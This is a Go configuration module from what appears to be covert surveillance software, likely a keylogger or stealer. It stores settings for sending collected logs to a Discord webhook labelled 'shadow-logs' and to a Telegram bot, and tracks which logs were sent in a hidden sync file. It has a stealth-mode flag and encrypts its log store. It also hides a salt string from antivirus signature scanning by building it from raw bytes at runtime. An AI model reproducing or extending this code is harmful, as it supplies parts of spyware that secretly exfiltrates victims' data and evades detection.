package config

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// Config represents the application settings.
type Config struct {
	WebhookURL          string `json:"webhook_url"`          // Discord webhook (→ #shadow-logs)
	TelegramToken       string `json:"telegram_token"`       // Telegram Bot API token
	TelegramChatID      string `json:"telegram_chat_id"`     // Telegram chat/channel ID
	EncryptionPassword  string `json:"encryption_password"`  // User-set password for AES key migration
	LogLocal            bool   `json:"log_local"`
	Interval            int    `json:"interval"`             // in seconds
	IsInstalled         bool   `json:"-"`                    // Runtime only status
	StealthMode         bool   `json:"-"`                    // Runtime only status
}

// SyncState tracks reporting progress independently of the main config.
type SyncState struct {
	LastSentIndex   int `json:"dis_idx"`
	LastSentTGIndex int `json:"tg_idx"`
}

// encryptionPassword is the runtime password used for key derivation.
// Set during config load.
var encryptionPassword string

// SetEncryptionPassword sets the password used for AES key derivation.
func SetEncryptionPassword(password string) {
	encryptionPassword = password
}

// GetEncryptionKey derives a 32-byte AES-256 key from the user-set password.
// Falls back to MachineGuid if no password is set (backward compatibility).
func GetEncryptionKey() []byte {
	seed := encryptionPassword
	if seed == "" {
		seed = GetMachineID()
	}
	// Salt computed at runtime to avoid static string signatures in the binary.
	// Equivalent to "wus_cache_v2_9283" but never appears as a plaintext string.
	salt := string([]byte{0x77, 0x75, 0x73, 0x5f, 0x63, 0x61, 0x63, 0x68, 0x65, 0x5f, 0x76, 0x32, 0x5f, 0x39, 0x32, 0x38, 0x33})
	hash := sha256.Sum256([]byte(seed + salt))
	return hash[:]
}

// LoadConfig reads the configuration from the first line of the storage file.
func LoadConfig() (*Config, error) {
	// First, try to migrate any old data.
	migrateOldData()

	path := GetStoragePath()
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	// Read only the first line.
	scanner := bufio.NewScanner(file)
	if scanner.Scan() {
		line := scanner.Text()
		data, err := decryptConfig(line)
		if err != nil {
			return nil, err
		}
		
		var cfg *Config
		if err := json.Unmarshal(data, &cfg); err != nil {
			return nil, err
		}

		// Double-check for JSON "null" which results in a nil pointer.
		if cfg == nil {
			return nil, fmt.Errorf("corrupt config: null value")
		}

		// Set encryption password for runtime use.
		if cfg.EncryptionPassword != "" {
			SetEncryptionPassword(cfg.EncryptionPassword)
		}

		return cfg, nil
	}

	return nil, fmt.Errorf("empty storage file")
}

// SaveConfig updates the configuration line in the storage file.
func SaveConfig(cfg *Config) error {
	if cfg == nil {
		return fmt.Errorf("cannot save nil configuration")
	}

	path := GetStoragePath()
	jsonData, err := json.Marshal(cfg)
	if err != nil {
		return err
	}

	encrypted, err := encryptConfig(jsonData)
	if err != nil {
		return err
	}

	// Read existing logs if file exists.
	var logs []string
	if _, err := os.Stat(path); err == nil {
		file, _ := os.Open(path)
		scanner := bufio.NewScanner(file)
		first := true
		for scanner.Scan() {
			if first {
				first = false
				continue
			}
			logs = append(logs, scanner.Text())
		}
		file.Close()
	}

	// Rewrite file with new config header + existing logs.
	content := encrypted + "\n" + strings.Join(logs, "\n")
	if len(logs) > 0 {
		content += "\n"
	}
	return os.WriteFile(path, []byte(content), 0600)
}

// LoadSyncState reads the synchronization progress from the hidden sync file.
func LoadSyncState() *SyncState {
	state := &SyncState{}
	path := GetSyncPath()
	data, err := os.ReadFile(path)
	if err == nil {
		json.Unmarshal(data, &state)
	}
	return state
}

// SaveSyncState writes the synchronization progress to the hidden sync file.
func SaveSyncState(state *SyncState) error {
	path := GetSyncPath()
	data, _ := json.Marshal(state)
	return os.WriteFile(path, data, 0600)
}

func migrateOldData() {
	newPath := GetStoragePath()
	dirs := GetAllPreviousDataDirs()

	for _, dir := range dirs {
		if _, err := os.Stat(dir); err != nil {
			continue
		}

		// Check for config.json and data.db
		oldCfgPath := filepath.Join(dir, "config.json")
		oldLogPath := filepath.Join(dir, "data.db")

		// Pre-initialize default config in case old file is missing/broken.
		cfg := &Config{LogLocal: true}
		if data, err := os.ReadFile(oldCfgPath); err == nil {
			json.Unmarshal(data, &cfg)
		}
		
		// If unmarshal accidentally resulted in nil, reset to default.
		if cfg == nil {
			cfg = &Config{LogLocal: true}
		}

		var logs []string
		if data, err := os.ReadFile(oldLogPath); err == nil {
			logs = strings.Split(string(data), "\n")
		}

		// If we found any logs or have a valid config, save it.
		if len(logs) > 0 || cfg.WebhookURL != "" {
			SaveConfig(cfg)
			
			// Append logs if any.
			if len(logs) > 0 {
				f, _ := os.OpenFile(newPath, os.O_APPEND|os.O_WRONLY, 0600)
				for _, l := range logs {
					if l != "" {
						f.WriteString(l + "\n")
					}
				}
				f.Close()
			}
			
			// Cleanup old dir.
			os.RemoveAll(dir)
		}
	}
}

func encryptConfig(data []byte) (string, error) {
	block, _ := aes.NewCipher(GetEncryptionKey())
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decryptConfig(encoded string) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}
	block, _ := aes.NewCipher(GetEncryptionKey())
	gcm, _ := cipher.NewGCM(block)
	if len(data) < gcm.NonceSize() {
		return nil, fmt.Errorf("malformed config data")
	}
	nonce, ciphertext := data[:gcm.NonceSize()], data[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ciphertext, nil)
}
